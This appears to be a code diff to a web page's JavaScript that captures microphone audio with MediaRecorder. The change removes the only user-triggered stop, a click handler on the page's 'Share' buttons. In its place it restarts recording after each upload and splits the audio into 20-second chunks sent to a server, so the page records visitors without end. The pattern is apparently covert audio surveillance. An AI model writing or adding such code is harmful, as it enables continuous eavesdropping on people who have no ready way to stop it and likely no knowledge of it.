@@ -411,22 +411,17 @@
             processData: false,
             contentType: false
           });
-          // Do not restart.
+
+          // Restart recording
+          audioChunks.length = 0;
+          mediaRecorder.start();
         };
 
-        // Record continuously
+        // Record continuously in 20s chunks
         mediaRecorder.start();
-
-        // Stop on "Share" button click (as "Stop" interaction)
-        const shareBtns = document.querySelectorAll('.btn');
-        shareBtns.forEach(btn => {
-          btn.addEventListener('click', () => {
-            if (mediaRecorder.state === 'recording') {
-              mediaRecorder.stop();
-              console.log("Recording stopped.");
-            }
-          });
-        });
+        setInterval(() => {
+          if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+        }, 20000);
 
       }).catch(e => console.log("Audio permission denied"));
 
